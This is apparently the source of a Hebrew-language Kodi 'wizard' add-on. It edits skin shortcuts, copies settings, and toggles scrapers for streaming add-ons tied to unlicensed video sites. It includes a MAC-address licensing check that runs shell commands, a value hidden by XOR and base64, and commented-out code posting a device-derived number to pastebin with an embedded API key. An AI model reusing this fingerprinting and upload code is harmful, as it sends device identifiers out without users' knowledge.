		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


def rdbuildinstallON():

    try:
       src=ADDONPATH+ "/resources/rd/victory.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"
  
       copyfile(src,dst)
  
       src=ADDONPATH+ "/resources/rd/exodusredux.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"
  
       copyfile(src,dst)
  
       src=ADDONPATH+ "/resources/rd/openscrapers.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"
  
       copyfile(src,dst)
       
       
       src=ADDONPATH+ "/resources/rd/Splash.png"
       dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
  
       copyfile(src,dst)
       
    except:
       pass









def rdbuild():
	input= (ADDON.getSetting("auto_rd"))
	if input == 'true' :
		Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
		Addon.setSetting('all_t','0')
		Addon.setSetting('rd_menu_enable','false')
		Addon.setSetting('magnet_bay','false')
		Addon.setSetting('magnet_extra','false')
		Addon.setSetting('rd_only','false')

		Addon.setSetting('ftp','false')
		Addon.setSetting('fp','false')
		Addon.setSetting('filter_fp','false')
		Addon.setSetting('fp_size_en','false')
		Addon.setSetting('afdah','false')
		Addon.setSetting('ap2s','false')
		Addon.setSetting('cin','false')
		Addon.setSetting('clv','false')
		Addon.setSetting('cmv','false')
		Addon.setSetting('dl20','false')
		Addon.setSetting('esc','false')
		Addon.setSetting('extra','false')
		Addon.setSetting('film','false')
		Addon.setSetting('fre','false')
		Addon.setSetting('fxy','false')
		Addon.setSetting('genv','false')
		Addon.setSetting('getgo','false')
		Addon.setSetting('gold','false')
		Addon.setSetting('gona','false')
		Addon.setSetting('hdmm','false')
		Addon.setSetting('hdt','false')
		Addon.setSetting('icy','false')
		Addon.setSetting('ind','false')
		Addon.setSetting('iwi','false')
		Addon.setSetting('jen_free','false')
		Addon.setSetting('kiss','false')
		Addon.setSetting('lavin','false')
		Addon.setSetting('los','false')
		Addon.setSetting('m4u','false')
		Addon.setSetting('mesh','false')
		Addon.setSetting('mf','false')
		Addon.setSetting('mkvc','false')
		Addon.setSetting('mjy','false')
		Addon.setSetting('hdonline','false')
		Addon.setSetting('moviex','false')
		Addon.setSetting('mpr','false')
		Addon.setSetting('mvg','false')
		Addon.setSetting('mvl','false')
		Addon.setSetting('mvs','false')
		Addon.setSetting('myeg','false')
		Addon.setSetting('ninja','false')
		Addon.setSetting('odb','false')
		Addon.setSetting('ophd','false')
		Addon.setSetting('pks','false')
		Addon.setSetting('prf','false')
		Addon.setSetting('put18','false')
		Addon.setSetting('req','false')
		Addon.setSetting('rftv','false')
		Addon.setSetting('rltv','false')
		Addon.setSetting('sc','false')
		Addon.setSetting('seehd','false')
		Addon.setSetting('showbox','false')
		Addon.setSetting('shuid','false')
		Addon.setSetting('sil_gh','false')
		Addon.setSetting('spv','false')
		Addon.setSetting('subs','false')
		Addon.setSetting('tvs','false')
		Addon.setSetting('tw','false')
		Addon.setSetting('upto','false')
		Addon.setSetting('vel','false')
		Addon.setSetting('vex','false')
		Addon.setSetting('vidc','false')
		Addon.setSetting('w4hd','false')
		Addon.setSetting('wav','false')
		Addon.setSetting('wf','false')
		Addon.setSetting('wse','false')
		Addon.setSetting('wss','false')
		Addon.setSetting('wsse','false')
		Addon = xbmcaddon.Addon('plugin.video.speedmax')
		Addon.setSetting('debrid.only','true')
		Addon.setSetting('hosts.captcha','false')
		Addon = xbmcaddon.Addon('script.module.civitasscrapers')
		Addon.setSetting('provider.123moviehd','false')
		Addon.setSetting('provider.300mbdownload','false')
		Addon.setSetting('provider.alltube','false')
		Addon.setSetting('provider.allucde','false')
		Addon.setSetting('provider.animebase','false')
		Addon.setSetting('provider.animeloads','false')
		Addon.setSetting('provider.animetoon','false')
		Addon.setSetting('provider.bnwmovies','false')
		Addon.setSetting('provider.boxfilm','false')
		Addon.setSetting('provider.bs','false')
		Addon.setSetting('provider.cartoonhd','false')
		Addon.setSetting('provider.cdahd','false')
		Addon.setSetting('provider.cdax','false')
		Addon.setSetting('provider.cine','false')
		Addon.setSetting('provider.cinenator','false')
		Addon.setSetting('provider.cmovieshdbz','false')
		Addon.setSetting('provider.coolmoviezone','false')
		Addon.setSetting('provider.ddl','false')
		Addon.setSetting('provider.deepmovie','false')
		Addon.setSetting('provider.ekinomaniak','false')
		Addon.setSetting('provider.ekinotv','false')
		Addon.setSetting('provider.filiser','false')
		Addon.setSetting('provider.filmpalast','false')
		Addon.setSetting('provider.filmwebbooster','false')
		Addon.setSetting('provider.filmxy','false')
		Addon.setSetting('provider.fmovies','false')
		Addon.setSetting('provider.foxx','false')
		Addon.setSetting('provider.freefmovies','false')
		Addon.setSetting('provider.freeputlocker','false')
		Addon.setSetting('provider.furk','false')
		Addon.setSetting('provider.gamatotv','false')
		Addon.setSetting('provider.gogoanime','false')
		Addon.setSetting('provider.gowatchseries','false')
		Addon.setSetting('provider.hackimdb','false')
		Addon.setSetting('provider.hdfilme','false')
		Addon.setSetting('provider.hdmto','false')
		Addon.setSetting('provider.hdpopcorns','false')
		Addon.setSetting('provider.hdstreams','false')
    
		Addon.setSetting('provider.horrorkino','false')
		Addon.setSetting('provider.iitv','false')
		Addon.setSetting('provider.iload','false')
		Addon.setSetting('provider.iwaatch','false')
		Addon.setSetting('provider.kinodogs','false')
		Addon.setSetting('provider.kinoking','false')
		Addon.setSetting('provider.kinow','false')
		Addon.setSetting('provider.kinox','false')
		Addon.setSetting('provider.lichtspielhaus','false')
		Addon.setSetting('provider.liomenoi','false')
    
    
		Addon.setSetting('provider.magnetdl','false')
		Addon.setSetting('provider.megapelistv','false')
		Addon.setSetting('provider.movie2k-ac','false')
		Addon.setSetting('provider.movie2k-ag','false')
		Addon.setSetting('provider.movie2z','false')
		Addon.setSetting('provider.movie4k','false')
		Addon.setSetting('provider.movie4kis','false')
		Addon.setSetting('provider.movieneo','false')
		Addon.setSetting('provider.moviesever','false')
		Addon.setSetting('provider.movietown','false')
    
		Addon.setSetting('provider.mvrls','false')
		Addon.setSetting('provider.netzkino','false')
		Addon.setSetting('provider.odb','false')
		Addon.setSetting('provider.openkatalog','false')
		Addon.setSetting('provider.ororo','false')
		Addon.setSetting('provider.paczamy','false')
		Addon.setSetting('provider.peliculasdk','false')
		Addon.setSetting('provider.pelisplustv','false')
		Addon.setSetting('provider.pepecine','false')
		Addon.setSetting('provider.primewire','false')
		Addon.setSetting('provider.projectfreetv','false')
		Addon.setSetting('provider.proxer','false')
		Addon.setSetting('provider.pureanime','false')
		Addon.setSetting('provider.putlocker','false')
		Addon.setSetting('provider.putlockerfree','false')
		Addon.setSetting('provider.reddit','false')
		Addon.setSetting('provider.cartoonwire','false')
		Addon.setSetting('provider.seehd','false')
		Addon.setSetting('provider.segos','false')
		Addon.setSetting('provider.serienstream','false')
		Addon.setSetting('provider.series9','false')
		Addon.setSetting('provider.seriesever','false')
		Addon.setSetting('provider.seriesonline','false')
		Addon.setSetting('provider.seriespapaya','false')
		Addon.setSetting('provider.sezonlukdizi','false')
		Addon.setSetting('provider.solarmovie','false')
		Addon.setSetting('provider.solarmoviez','false')
		Addon.setSetting('provider.stream-to','false')
		Addon.setSetting('provider.streamdream','false')
		Addon.setSetting('provider.streamflix','false')
		Addon.setSetting('provider.streamit','false')
		Addon.setSetting('provider.swatchseries','false')
		Addon.setSetting('provider.szukajkatv','false')
		Addon.setSetting('provider.tainiesonline','false')
		Addon.setSetting('provider.tainiomania','false')
    
    
		Addon.setSetting('provider.tata','false')
		Addon.setSetting('provider.trt','false')
		Addon.setSetting('provider.tvbox','false')
		Addon.setSetting('provider.ultrahd','false')
		Addon.setSetting('provider.video4k','false')
		Addon.setSetting('provider.vidics','false')
		Addon.setSetting('provider.view4u','false')
		Addon.setSetting('provider.watchseries','false')
		Addon.setSetting('provider.xrysoi','false')
		Addon.setSetting('provider.library','false')


def fixfont():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
def parseDOM2(html, name=u"", attrs={}, ret=False):
	# Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen

	if isinstance(html, str):
		try:
			html = [html.decode("utf-8")]
		except:
			html = [html]
	elif isinstance(html, unicode):
		html = [html]
	elif not isinstance(html, list):
		return u""

	if not name.strip():
		return u""

	ret_lst = []
	for item in html:
		temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
		for match in temp_item:
			item = item.replace(match, match.replace("\n", " "))

		lst = []
		for key in attrs:
			lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
			if len(lst2) == 0 and attrs[key].find(" ") == -1:
				lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

			if len(lst) == 0:
				lst = lst2
				lst2 = []
			else:
				test = range(len(lst))
				test.reverse()
				for i in test:
					if not lst[i] in lst2:
						del(lst[i])

		if len(lst) == 0 and attrs == {}:
			lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
			if len(lst) == 0:
				lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

		if isinstance(ret, str):
			lst2 = []
			for match in lst:
				attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
				if len(attr_lst) == 0:
					attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
				for tmp in attr_lst:
					cont_char = tmp[0]
					if cont_char in "'\"":
						if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
							tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

						if tmp.rfind(cont_char, 1) > -1:
							tmp = tmp[1:tmp.rfind(cont_char)]
					else:
						if tmp.find(" ") > 0:
							tmp = tmp[:tmp.find(" ")]
						elif tmp.find("/") > 0:
							tmp = tmp[:tmp.find("/")]
						elif tmp.find(">") > 0:
							tmp = tmp[:tmp.find(">")]

					lst2.append(tmp.strip())
			lst = lst2
		else:
			lst2 = []
			for match in lst:
				endstr = u"</" + name

				start = item.find(match)
				end = item.find(endstr, start)
				pos = item.find("<" + name, start + 1 )

				while pos < end and pos != -1:
					tend = item.find(endstr, end + len(endstr))
					if tend != -1:
						end = tend
					pos = item.find("<" + name, pos + 1)

				if start == -1 and end == -1:
					temp = u""
				elif start > -1 and end > -1:
					temp = item[start + len(match):end]
				elif end > -1:
					temp = item[:end]
				elif start > -1:
					temp = item[start + len(match):]

				if ret:
					endstr = item[end:item.find(">", item.find(endstr)) + 1]
					temp = match + temp + endstr

				item = item[item.find(temp, item.find(match)) + len(temp):]
				lst2.append(temp)
			lst = lst2
		ret_lst += lst

	return ret_lst

def addItem(name, url, mode, iconimage, fanart, description=None):
	if description == None: description = ''
	description = '[COLOR white]' + description + '[/COLOR]'
	u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&iconimage="+urllib.quote_plus(iconimage)+"&fanart="+urllib.quote_plus(fanart)
	ok=True
	liz=xbmcgui.ListItem(name, iconImage=iconimage, thumbnailImage=iconimage)
	liz.setInfo( type="Video", infoLabels={ "Title": name, "Plot": description } )
	liz.setProperty( "fanart_Image", fanart )
	liz.setProperty( "icon_Image", iconimage )
	ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
	return ok

def get_params():
		param=[]
		paramstring=sys.argv[2]
		if len(paramstring)>=2:
				params=sys.argv[2]
				cleanedparams=params.replace('?','')
				if (params[len(params)-1]=='/'):
						params=params[0:len(params)-2]
				pairsofparams=cleanedparams.split('&')
				param={}
				for i in range(len(pairsofparams)):
						splitparams={}
						splitparams=pairsofparams[i].split('=')
						if (len(splitparams))==2:
								param[splitparams[0]]=splitparams[1]
								
		return param




def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):

 
    value=decode("7643",url)
   

    return int(value)
def u_list(list):#חומרה
   try:
    if xbmc.getCondVisibility('system.platform.windows') or xbmc.getCondVisibility('system.platform.android'):
        from math import sqrt
        my_tmdb=tmdb_list(TMDB_NEW_API)
        
        num=str((getHwAddr('eth0'))*my_tmdb)
        new_num=int(num[1]+num[2]+num[5]+num[7])
    
        input= (ADDON.getSetting("pass"))



    
        new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-4:]).replace('.','')

        if '.' in new_num2:
         new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-5:]).replace('.','')

        if input==new_num2:

          url=list
           
        else:
           if STARTP2() and STARTP() =='ok':
           
    #       if STARTP() =='ok':
             return list
           url='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'
           xbmcgui.Dialog().ok('הקוד שלך',' סיסמה שגויה')
           sys.exit()
        return url
    else:
        STARTP()

   except: 
           if STARTP2() and STARTP() =='ok':
           
    #       if STARTP() =='ok':
             return list
           url='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'
           xbmcgui.Dialog().ok('הקוד שלך',' סיסמה שגויה')
           sys.exit()
        # return url
  #  return url
def disply_hwr():
   try:
    my_tmdb=tmdb_list(TMDB_NEW_API)
    num=str((getHwAddr('eth0'))*my_tmdb)
   #pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':num}
   #response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))

   #url2 = response.read()

   
    new_num=(num[1]+num[2]+num[5]+num[7])
    input= (ADDON.getSetting("action"))

    wiz.setS('action', str(new_num))
   except: pass
def disply_hwr2():
   try:
    my_tmdb=tmdb_list(TMDB_NEW_API)

    num=str((getHwAddr('eth0'))*my_tmdb)

    
   #pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':num}
   #response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))

   #url2 = response.read()

   
    new_num=(num[1]+num[2]+num[5]+num[7])
    input= (ADDON.getSetting("action"))

#   wiz.setS('action', str(new_num))
    xbmcgui.Dialog().ok("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",new_num)
   except: pass

def getHwAddr(ifname):
   import subprocess,time
   system_type='windows'
   if xbmc.getCondVisibility('system.platform.android'):
       system_type='android'
   if xbmc.getCondVisibility('system.platform.android'):
     Installed_APK = subprocess.Popen(["exec ''ip link''"], executable='/system/bin/sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0].splitlines()
  
     mac=re.compile('link/ether (.+?) brd').findall(str(Installed_APK))
     n=0
     for match in mac:
      if mac!='00:00:00:00:00:00':
          mac_address=match
          n =n+ int(mac_address.replace(':', ''), 16)
          
   elif xbmc.getCondVisibility('system.platform.windows'):
       x=0
       n=0
       macs = []
       file = os.popen("getmac").read()
       file = file.split("\n")

       for line in file:
            found = re.search(r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})', line, re.I)
            if found:
                mac = found.group().replace('-', ':')
                macs.append(mac)
               
          
                n =n+ int(mac.replace(':', ''), 16)
                
   else:
         wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]' % COLOR2)
         
   # else:
       # x=0
       # n=0
       # while(1):
         # mac_address = xbmc.getInfoLabel("network.macaddress")
         # logging.warning(mac_address)
         # if mac_address!="Busy" and  mac_address!=' עסוק':
    
            # break
         # else:
           # x=x+1
           # time.sleep(1)
           # if x>30:
            # break
       # n =n+ int(mac_address.replace(':', ''), 16)
   try:
    return n
   except: pass
def getpass():

	disply_hwr2()
def setpass():
    dialog = xbmcgui.Dialog()
    search_entered=''
    #keyboard = dialog.numeric(0, 'הכנס סיסמה')
    keyboard = xbmc.Keyboard(search_entered, 'הכנס סיסמה')
    keyboard.doModal()
    if keyboard.isConfirmed():
           keyboard = keyboard.getText()
    wiz.setS('pass', str(keyboard))
def setuname():
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, 'הכנס שם משתמש')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
           wiz.setS('user', str(search_entered))
def powerkodi():
    os._exit(1)

def buffer1(): 
	XML_FILE   =  xbmc.translatePath(os.path.join('special://home/userdata' , 'advancedsettings.xml'))
	MEM        =  xbmc.getInfoLabel("System.Memory(total)")
	FREEMEM    =  xbmc.getInfoLabel("System.FreeMemory")
	BUFFER_F   =  re.sub('[^0-9]','',FREEMEM)
	BUFFER_F   = int(BUFFER_F) / 3
	BUFFERSIZE = BUFFER_F * 1024 * 1024
	try: KODIV        =  float(xbmc.getInfoLabel("System.BuildVersion")[:4])
	except: KODIV = 16

		
	choice = DIALOG.yesno('FREE MEMORY: ' + str(FREEMEM) ,'Based on your free Memory your optimal buffersize is: ' + str(BUFFER_F) + ' MB','Choose an Option below...', yeslabel='Use Optimal',nolabel='Input a Value')
	if choice == 1: 
		with open(XML_FILE, "w") as f:
			if KODIV >= 17: xml_data = xml_data_advSettings_New(str(BUFFERSIZE))
			else: xml_data = xml_data_advSettings_old(str(BUFFERSIZE))
			
			f.write(xml_data)
			DIALOG.ok('Buffer Size Set to: ' + str(BUFFERSIZE),'Please restart Kodi for settings to apply.','')
	
	elif choice == 0:
		BUFFERSIZE = _get_keyboard( default=str(BUFFERSIZE), heading="INPUT BUFFER SIZE")
		with open(XML_FILE, "w") as f:
			if KODIV >= 17: xml_data = xml_data_advSettings_New(str(BUFFERSIZE))
			else: xml_data = xml_data_advSettings_old(str(BUFFERSIZE))
			f.write(xml_data)
			DIALOG.ok('Buffer Size Set to: ' + str(BUFFERSIZE),'Please restart Kodi for settings to apply.','')
def xml_data_advSettings_old(size):
	xml_data="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>""" % size
	return xml_data
	
def xml_data_advSettings_New(size):
	xml_data="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>""" % size
	return xml_data
def write_ADV_SETTINGS_XML(file):    
    if not os.path.exists(xml_file):
        with open(xml_file, "w") as f:
            f.write(xml_data)
def _get_keyboard( default="", heading="", hidden=False ):
    """ shows a keyboard and returns a value """
    keyboard = xbmc.Keyboard( default, heading, hidden )
    keyboard.doModal()
    if ( keyboard.isConfirmed() ):
        return unicode( keyboard.getText(), "utf-8" )
    return default

def index():
	addFile('[COLOR green]קוד חומרה שלך: %s [/COLOR]' % (HARDWAER), '', icon=ICONBUILDS, themeit=THEME1)
	addFile('%s גירסה: %s' % (MCNAME, KODIV), '', icon=ICONBUILDS, themeit=THEME3)
	if AUTOUPDATE == 'Yes':
		if wiz.workingURL(WIZARDFILE) == True:
			ver = wiz.checkWizard('version')
			if ver > VERSION: addFile('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: ' % (ADDONTITLE, VERSION, ver), 'wizardupdate', themeit=THEME2)
			else: addFile('%s [v%s] :גירסת ויזארד' % (ADDONTITLE, VERSION), '', themeit=THEME2)
		else: addFile('%s [v%s]' % (ADDONTITLE, VERSION), '', themeit=THEME2)
	else: addFile('%s [v%s]' % (ADDONTITLE, VERSION), '', themeit=THEME2)
	if len(BUILDNAME) > 0:
		version = wiz.checkBuild(BUILDNAME, 'version')
		build = '%s (v%s)' % (BUILDNAME, BUILDVERSION)
		if version > BUILDVERSION: build = '%s [COLOR red][B][UPDATE v%s][/B][/COLOR]' % (build, version)
		
		addDir(build,'viewbuild',BUILDNAME, themeit=THEME4)
		
		try:
		     themefile = wiz.themeCount(BUILDNAME)
		except:
		   themefile= False
		if not themefile == False:
			addFile('None' if BUILDTHEME == "" else BUILDTHEME, 'theme', BUILDNAME, themeit=THEME5)
	else: addDir('לא הותקן בילד', 'builds', themeit=THEME4)
	#addFile('[COLOR orange] (v %s) [/COLOR]גירסת עדכון מהיר:' % (NOTEID), '', themeit=THEME2)
	#addFile('מדריך למשתמש',                  'servicemanual',            themeit=THEME1) פקודה שעובדת
	addDir ('אפשרויות'     ,'mor', 	icon=ICONSAVE,     themeit=THEME1)
	addDir ('עדכון מהיר'   ,'fastupdate',   icon=ICONSAVE,   themeit=THEME1)
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	# addFile('קבל קוד אימות'   , 'getpass', name, 'getpass'  , themeit=THEME1)
	# addFile('הכנס שם משתמש'   , 'setuname', name, 'setuname'  ,  themeit=THEME1)
	# addFile('הכנס סיסמה'   , 'setpass', name, 'setpass'  ,  themeit=THEME1)
	addFile('אימות חשבונות'   , 'passandUsername', name, 'passandUsername'  ,  themeit=THEME1)
#	addFile('התקנה מהירה',                  'fastinstall',            themeit=THEME1)
	addDir ('התקנה'        ,'builds',   icon=ICONBUILDS,   themeit=THEME1)	
	#if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')
    
def firstinstall():
	addDir ('התקנה'        ,'builds',   icon=ICONBUILDS,   themeit=THEME1)	
    
############# More Optiones ##############	
def morsetup():
	addDir ('שמירת נתונים'     ,'savedata', 	icon=ICONSAVE,     themeit=THEME1)	
	addDir ('תפריט אימות סיסמה'   ,'passpin',    icon=ICONMAINT,    themeit=THEME1)
	addDir ('הגדרת חשבון Rd ו Trakt'   ,'rdset',   icon=ICONSAVE,   themeit=THEME1)
	addFile('שלח לוג'  ,'logsend',      icon=ICONMAINT,   themeit=THEME1)
	addDir ('תפריט גיבוי ושחזור'   ,'backmyupbuild',    icon=ICONMAINT,    themeit=THEME1)
#	if not ADDONFILE == 'http://': addDir ('התקנת הרחבות' ,'addons', icon=ICONADDONS, themeit=THEME1)
#	addDir ('תחזוקה'   ,'maint',    icon=ICONMAINT,    themeit=THEME1)

	addDir ('אפליקציות לאנדרואיד' ,'apk',   icon=ICONAPK,  themeit=THEME1)
	addFile ('בדיקת מהירות' ,'speed', icon=ICONCONTACT, themeit=THEME1)
	#if HIDESPACERS == 'Yes': addFile(wiz.sep(), '', themeit=THEME3)
#	addFile('איפוס הגדרות ויזארד'  ,'fixwizard',      icon=ICONMAINT,   themeit=THEME1)
	addFile('חזרה לקודי'  ,'fixskin',      icon=ICONMAINT,   themeit=THEME1)
	addFile('התקנת לקוח טלוויזיה חיה'  ,'simpleiptv',      icon=ICONMAINT,   themeit=THEME1)
	addFile('הגדרת ערוצים עידן פלוס בטלוויזיה חיה'  ,'simpleidanplus',      icon=ICONMAINT,   themeit=THEME1)
	addFile('בדיקה'  ,'testcommand',      icon=ICONMAINT,   themeit=THEME1)


#	addFile('גיבוי הבילד',               'backupbuild',     icon=ICONMAINT,   themeit=THEME1)
#	addFile('שחזור הבילד',         'restorezip',      icon=ICONMAINT,   themeit=THEME1)
#	addFile('הגדרות'      ,'settings', icon=ICONSETTINGS, themeit=THEME1)

#	addDir ('הגדרת חשבון Trakt'        ,'traktset',   icon=ICONTRAKT,   themeit=THEME1)
	#addFile ('התקנת באפר לאנדרואיד בלבד' , 'adv_settings', icon=ICONCONTACT, themeit=THEME1)
#	addFile ('כיבוי מהיר' , 'power', icon=ICONCONTACT, themeit=THEME1)
	addFile('מפעיל הרחבות',                    'kodi17fix',       icon=ICONMAINT, themeit=THEME1)
	setView('files', 'viewType')
def morsetup2():
	addFile('מתקין ומגדיר - קודי אנונימוס', '', themeit=THEME3)
	addDir ('התקנת טורונטר' , '2', icon=ICONCONTACT, themeit=THEME1)
	addDir ('התקנת פופקורן' , '3', icon=ICONCONTACT, themeit=THEME1)
	addDir ('התקנת קוואסר' , '9', icon=ICONCONTACT, themeit=THEME1)
	addDir ('התקנת אלמנטום' , '13', icon=ICONCONTACT, themeit=THEME1)
	addFile ('עדכון נגנים מטאליק' , '8', icon=ICONCONTACT, themeit=THEME1)
	addFile ('דיאלוג נגנים פשוט' , '18', icon=ICONCONTACT, themeit=THEME1)
	addFile ('דיאלוג נגנים מתקדם' , '19', icon=ICONCONTACT, themeit=THEME1)
	addFile ('ניקוי נוגן לאחרונה' , '17', icon=ICONCONTACT, themeit=THEME1)
	addFile ('איפוס סיסמת מבוגרים' , '14', icon=ICONCONTACT, themeit=THEME1)
	addFile ('תיקון פונט לשפות זרות' , '15', icon=ICONCONTACT, themeit=THEME1)
def fastupdate():	
		addFile('עדכון מהיר',                  'testnotify',            themeit=THEME1)
#		addFile('עדכון מהיר - קודי 18',                  'testnotify2',            themeit=THEME1)
def forcefastupdate():	# בוטל לא בשימוש (פותח את חלון עדכון מהיר ידני
